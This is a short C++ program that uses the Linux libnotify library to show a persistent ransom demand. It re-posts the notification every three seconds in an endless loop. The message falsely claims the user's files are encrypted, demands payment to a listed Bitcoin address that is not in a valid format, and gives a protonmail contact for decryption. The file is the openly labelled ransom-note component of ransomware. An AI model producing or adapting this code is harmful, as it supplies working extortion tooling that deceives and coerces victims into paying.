#include <libnotify/notify.h>
#include <thread>
#include <chrono>
#include <string>
#include <unistd.h>

int main() {
    const char* notify_tittle = "Ransom Productions C";
    const char* encrypt_message = ":warning: Warning! Your system is encrypted. Pay to regain access to files."
                                " Ransomware is a threat; understand risks."
                                " Don't alter files or decrypt data; risk loss or damage."
                                " To restore files, pay to Bitcoin address: 0x164593446094360439."
                                " After payment, email ransomprocs@protonmail.com for decryption.";

    // Initialize the notification library
    notify_init("ransomprocs");

    // Create a new notification
    NotifyNotification* notification = notify_notification_new(
        notify_tittle,   // Title
        encrypt_message,       // Message
        "xfce-system-lock"    // Icon (see: /usr/share/icons/)
    );

    // Show the notification
    while (true) {
        // Show the notification
        notify_notification_show(notification, nullptr);

        // Wait for a few seconds
        std::this_thread::sleep_for(std::chrono::seconds(3)); // Adjust the duration as needed

        // Update the notification to prevent fading away
        notify_notification_update(notification, notify_tittle, encrypt_message, "xfce-system-lock");
    }


    // Clean up
    g_object_unref(G_OBJECT(notification));
    notify_uninit();
    return 0;
}